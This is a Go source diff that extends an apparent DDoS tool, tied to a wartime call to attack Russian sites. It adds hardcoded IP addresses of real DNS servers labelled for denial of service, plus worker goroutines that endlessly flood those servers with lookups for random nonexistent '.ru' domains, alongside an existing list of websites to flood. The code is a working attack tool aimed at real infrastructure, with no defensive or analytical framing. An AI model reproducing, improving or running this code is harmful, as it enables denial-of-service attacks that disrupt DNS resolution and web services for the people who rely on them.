@@ -1,12 +1,15 @@
 package main
 
 import (
+	"context"
 	"crypto/tls"
 	"encoding/json"
 	"flag"
 	"io"
 	"io/ioutil"
 	"log"
+	"math/rand"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -18,7 +21,17 @@ import (
 	"github.com/peterbourgon/ff/v3"
 )
 
-// https://twitter.com/FedorovMykhailo/status/1497642156076511233
+/*###
+##### https://twitter.com/FedorovMykhailo/status/1497642156076511233
+###*/
+
+var dnsServersToDOS = map[string]struct{}{
+	"194.54.14.186:53": {},
+	"194.54.14.187:53": {},
+	"194.67.7.1:53":    {},
+	"194.67.2.109:53":  {},
+}
+
 var links = map[string]struct{}{
 	/* Other countries */
 
@@ -174,6 +187,14 @@ var links = map[string]struct{}{
 	"https://grodnonews.by/":     {},
 }
 
+type DNSServer struct {
+	Server   string `json:"server"`
+	Requests uint   `json:"requests"`
+	Errors   uint   `json:"errors"`
+
+	mux *sync.Mutex
+}
+
 type Website struct {
 	Link         string `json:"url"`
 	Requests     uint   `json:"requests"`
@@ -189,6 +210,7 @@ type Website struct {
 	mux *sync.Mutex
 }
 
+var dnsServers = []*DNSServer{}
 var websites = []*Website{}
 
 var httpClient http.Client
@@ -204,6 +226,15 @@ var (
 func main() {
 	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))
 
+	for dnsServer := range dnsServersToDOS {
+		ds := &DNSServer{
+			Server: dnsServer,
+			mux:    &sync.Mutex{},
+		}
+		dnsServers = append(dnsServers, ds)
+		ds.Start()
+	}
+
 	for link := range links {
 		w := &Website{
 			Link: link,
@@ -218,38 +249,97 @@ func main() {
 	panic(http.ListenAndServe(*flagBind, nil))
 }
 
+type StatusStruct struct {
+	DNS      []DNSServer `json:"DNS"`
+	Websites []Website   `json:"Websites"`
+
+	mux *sync.Mutex
+}
+
 func status(w http.ResponseWriter, req *http.Request) {
-	tmpWebsites := []Website{}
-	tmpWebsitesMux := sync.Mutex{}
+	statusStruct := StatusStruct{
+		DNS:      []DNSServer{},
+		Websites: []Website{},
+		mux:      &sync.Mutex{},
+	}
 
 	wg := sync.WaitGroup{}
+	wg.Add(len(dnsServers))
 	wg.Add(len(websites))
+
+	for _, ds := range dnsServers {
+		go func(ds *DNSServer) {
+			ds.mux.Lock()
+			dnsServer := *ds
+			ds.mux.Unlock()
+
+			statusStruct.mux.Lock()
+			statusStruct.DNS = append(statusStruct.DNS, dnsServer)
+			statusStruct.mux.Unlock()
+
+			wg.Done()
+		}(ds)
+	}
+
 	for _, ws := range websites {
 		go func(ws *Website) {
 			ws.mux.Lock()
 			tmpWebsite := *ws
 			ws.mux.Unlock()
 
-			tmpWebsitesMux.Lock()
-			tmpWebsites = append(tmpWebsites, tmpWebsite)
-			tmpWebsitesMux.Unlock()
+			statusStruct.mux.Lock()
+			statusStruct.Websites = append(statusStruct.Websites, tmpWebsite)
+			statusStruct.mux.Unlock()
 
 			wg.Done()
 		}(ws)
 	}
+
 	wg.Wait()
 
-	sort.Slice(tmpWebsites, func(i, j int) bool {
-		return strings.Compare(tmpWebsites[i].Link, tmpWebsites[j].Link) <= 0
+	sort.Slice(statusStruct.DNS, func(i, j int) bool {
+		return strings.Compare(statusStruct.DNS[i].Server, statusStruct.DNS[j].Server) <= 0
+	})
+	sort.Slice(statusStruct.Websites, func(i, j int) bool {
+		return strings.Compare(statusStruct.Websites[i].Link, statusStruct.Websites[j].Link) <= 0
 	})
 
-	content, err := json.MarshalIndent(tmpWebsites, "", "    ")
+	content, err := json.MarshalIndent(statusStruct, "", "    ")
 	if err != nil {
 		http.Error(w, "failed to marshal data", http.StatusInternalServerError)
 		return
 	}
 	w.WriteHeader(200)
 	w.Write(content)
+}
+
+func (ds *DNSServer) Start() {
+	r := &net.Resolver{
+		PreferGo: true,
+		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+			d := net.Dialer{
+				Timeout: *flagTimeout,
+			}
+			return d.DialContext(ctx, network, ds.Server)
+		},
+	}
+
+	f := func() {
+		for {
+			domain := getRandomDomain()
+			_, err := r.LookupHost(context.Background(), domain)
+			ds.mux.Lock()
+			ds.Requests++
+			if err != nil {
+				ds.Errors++
+			}
+			ds.mux.Unlock()
+		}
+	}
+
+	for i := 0; i < *flagWorkers; i++ {
+		go f()
+	}
 }
 
 func (ws *Website) Start() {
@@ -315,6 +405,8 @@ func (ws *Website) Start() {
 }
 
 func init() {
+	rand.Seed(time.Now().UnixNano())
+
 	fIgnoreRedirects := func(req *http.Request, via []*http.Request) error {
 		return http.ErrUseLastResponse
 	}
@@ -327,4 +419,15 @@ func init() {
 		CheckRedirect: fIgnoreRedirects, // Disable auto redirects
 		Transport:     tr,
 	}
+}
+
+var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+
+func getRandomDomain() string {
+	randomLength := rand.Intn(20-6) + 6 // from 6 to 20 characters length + ".ru"
+	b := make([]rune, randomLength)
+	for i := range b {
+		b[i] = letterRunes[rand.Intn(len(letterRunes))]
+	}
+	return string(b) + ".ru"
 }
